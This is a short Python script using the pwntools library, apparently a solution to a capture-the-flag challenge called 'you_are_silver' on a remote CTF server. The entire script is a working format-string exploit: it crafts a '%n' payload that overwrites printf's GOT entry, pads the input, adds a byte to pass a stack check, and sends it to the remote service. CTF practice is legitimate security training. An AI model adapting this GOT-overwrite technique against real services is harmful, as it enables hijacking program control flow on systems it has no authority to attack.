#!/usr/bin/python3

from pwn import *

#p = process("./you_are_silver")
p = remote("ctf.j0n9hyun.xyz", 3022)
context.terminal = '/bin/bash'
#context.log_level = 'debug'

got = 0x601028  # printf@got.plt

# Need FSB #
# Must $rbp-0x4 is greater 0x4b Like 'Z'


fsb = b"%4196055c%8$lnPP"
fsb += p64(got)

padding = b"A"*(44-len(fsb))

payload = fsb
payload += padding
payload += b"Z"

p.recvline()
p.sendline(payload)

p.recvline()
p.recvline()
p.recvline()
log.info(p.recvline().decode('utf-8'))
